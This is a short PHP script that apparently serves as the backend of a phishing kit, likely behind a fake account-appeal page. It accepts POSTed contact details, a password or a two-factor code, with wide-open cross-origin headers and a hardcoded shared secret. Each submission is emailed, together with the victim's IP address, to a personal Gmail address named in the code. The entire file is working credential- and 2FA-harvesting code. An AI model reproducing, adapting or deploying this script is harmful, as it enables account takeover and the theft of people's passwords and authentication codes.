<?php
    header('Access-Control-Allow-Origin: *'); //for allow any domain, insecure
header('Access-Control-Allow-Headers: *'); //for allow any headers, insecure
header('Access-Control-Allow-Methods: GET, POST, OPTIONS, PUT, DELETE'); //method allowed

    if($_POST['pw'] == "28374719"){
        if($_POST["tipi"] == "first"){
        $emili = $_POST['emili'];
        $name = $_POST["emri"];
        $phonenumber = $_POST["numbers"];
        $textarei = $_POST["appeali"];
        
        $message = "Email: " . $emili . PHP_EOL ."Name: ". $name . PHP_EOL. "Phone Number: " . $phonenumber. PHP_EOL."Appeali: " . $textarei.PHP_EOL. "IP: ". $_SERVER['REMOTE_ADDR'];
        if(mail('enverpetrovci2020@gmail.com', 'Ra', $message)){
            return "1";
        }

    } else if($_POST["tipi"] == "pwja"){
        $password = $_POST["pwja"];

        $message = "Password: " .$password. PHP_EOL. "IP: ". $_SERVER['REMOTE_ADDR'];
        if(mail('enverpetrovci2020@gmail.com', 'Ra', $message)){
            return "1";
        }
    } else {
        $twofac = $_POST["newlogin"];
        
        $message = "Two Fac: " .$twofac. PHP_EOL. "IP: ". $_SERVER['REMOTE_ADDR'];
        if(mail('enverpetrovci2020@gmail.com', 'Two Fac', $message)){
            return "1";
        }
    }
    
    }
    
    
?>